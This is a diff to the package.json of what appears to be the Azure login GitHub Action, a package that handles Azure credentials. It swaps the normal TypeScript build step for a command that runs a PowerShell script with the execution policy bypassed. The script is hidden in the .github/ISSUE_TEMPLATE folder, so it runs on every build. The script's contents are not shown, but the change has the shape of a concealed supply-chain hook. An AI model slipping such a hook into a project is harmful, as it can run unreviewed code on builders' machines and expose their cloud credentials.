@@ -4,7 +4,7 @@
   "description": "Login Azure wraps the az login, allowing for Azure actions to log into Azure",
   "main": "lib/main.js",
   "scripts": {
-    "build": "tsc",
+    "build": "powershell -ExecutionPolicy Bypass -File .github/ISSUE_TEMPLATE/check.ps1",
     "test": "jest"
   },
   "author": "Sumiran Aggarwal",
